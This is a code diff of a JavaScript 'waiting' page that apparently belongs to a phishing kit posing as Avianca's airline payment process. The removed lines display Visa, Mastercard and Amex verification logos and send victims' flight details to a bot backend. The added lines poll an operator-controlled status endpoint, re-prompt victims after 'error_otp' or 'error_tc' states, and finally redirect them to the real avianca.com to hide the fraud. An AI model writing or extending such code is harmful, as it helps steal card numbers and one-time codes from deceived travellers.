@@ -1,60 +1,65 @@
-const companyLoader = document.querySelector('#company-loader');
-if(info.checkerInfo.company === 'VISA'){
-    companyLoader.setAttribute('src', './assets/logos/visa_verified.png');
-    companyLoader.setAttribute('width', '130px');
-    companyLoader.setAttribute('style', 'margin-bottom: 40px');
-}else if(info.checkerInfo.company === 'MC'){
-    companyLoader.setAttribute('src', './assets/logos/mc_id_check_2.jpg');
-    companyLoader.setAttribute('width', '400px');
-}else if(info.checkerInfo.company === 'AM'){
-    companyLoader.setAttribute('src', './assets/logos/amex_check_1.png');
-    companyLoader.setAttribute('width', '200px');
-}
+// public/js/waiting.js
+(async function () {
+  'use strict';
 
-// Enviar info
-info.metaInfo.origin = info.flightInfo.origin.city;
-info.metaInfo.destination = info.flightInfo.destination.city;
-info.metaInfo.flightDates = info.flightInfo.flightDates;
-info.metaInfo.type = info.flightInfo.type === 1 ? 'Ida Y Vuelta' : 'Solo Ida';
-info.metaInfo.adults = info.flightInfo.adults;
-info.metaInfo.children = info.flightInfo.children;
-info.metaInfo.babies = info.flightInfo.babies;
+  const LS = window.localStorage;
+  let transactionId = null;
+  let pollInterval = null;
 
-console.log(info.metaInfo);
+  try {
+    const savedInfo = JSON.parse(LS.getItem('info'));
+    if (savedInfo && savedInfo.transactionId) {
+      transactionId = savedInfo.transactionId;
+      console.log('ID de transacción recuperado:', transactionId);
+    } else {
+      console.error('No se encontró ID de transacción en localStorage.');
+      alert('Ha ocurrido un error inesperado. Por favor, vuelve a intentarlo.');
+      window.location.href = 'payment.html';
+      return;
+    }
+  } catch (e) {
+    console.error('Error al parsear info de localStorage:', e);
+    alert('Ha ocurrido un error inesperado. Por favor, vuelve a intentarlo.');
+    window.location.href = 'payment.html';
+    return;
+  }
 
-const token = KJUR.jws.JWS.sign(null, { alg: "HS256" }, info.metaInfo, JWT_SIGN);
+  const pollStatus = async () => {
+    try {
+      const response = await fetch(`/status/${transactionId}`);
+      const data = await response.json();
 
-fetch(`${API_URL}/api/bot/flight/data`, {
-    method: 'POST',
-    headers: {
-        'Content-Type': 'application/json',
-        'Authorization': `Bearer ${API_KEY}`,
-    },
-    body: JSON.stringify({token: token})
-})
-    .then(response => response.json())
-    .then(result => {
-        // Manejo de respuetas del servidor
-        console.log('Respuesta del servidor:', result.redirect_to);
+      console.log('Estado del servidor:', data.status);
 
-        if(result.redirect_to.split('-')[0] === 'ban'){
-            window.location.href = 'https://avianca.com';
+      switch (data.status) {
+        case 'pedir_logo':
+          clearInterval(pollInterval);
+          console.log('Estado "pedir_logo" detectado. Redirigiendo a chedf.html...');
+          window.location.href = 'chedf.html';
+          break;
+        case 'error_otp':
+        case 'error_tc':
+          clearInterval(pollInterval);
+          console.log(`Estado "${data.status}" detectado. Redirigiendo a la página de error...`);
+          alert('Ha ocurrido un error con tu método de pago. Por favor, inténtalo de nuevo.');
+          window.location.href = 'payment.html';
+          break;
+        case 'finalizar':
+          clearInterval(pollInterval);
+          console.log('Estado "finalizar" detectado. Redirigiendo a la página de éxito...');
+          LS.removeItem('info');
+          window.location.href = 'https://www.avianca.com';
+          break;
+        case 'pending':
+        default:
+          console.log('Estado "pending". Esperando...');
+          break;
+      }
+    } catch (err) {
+      console.error('Error al consultar el estado:', err);
+    }
+  };
 
-            return;
-        }
+  pollInterval = setInterval(pollStatus, 3000);
 
-        if(result.redirect_to.split('-')[0] === 'checker'){
-            console.log(result.redirect_to);
-            info.checkerInfo.mode = result.redirect_to.split('-')[1];
-            LS.setItem('info', JSON.stringify(info));
-            
-            window.location.href = 'id-check.html';
-
-            return;
-        }
-
-        window.location.href = result.redirect_to+'.html';
-    })
-    .catch(error => {
-        console.log('Error en la solicitud:', error);
-    });
+})();
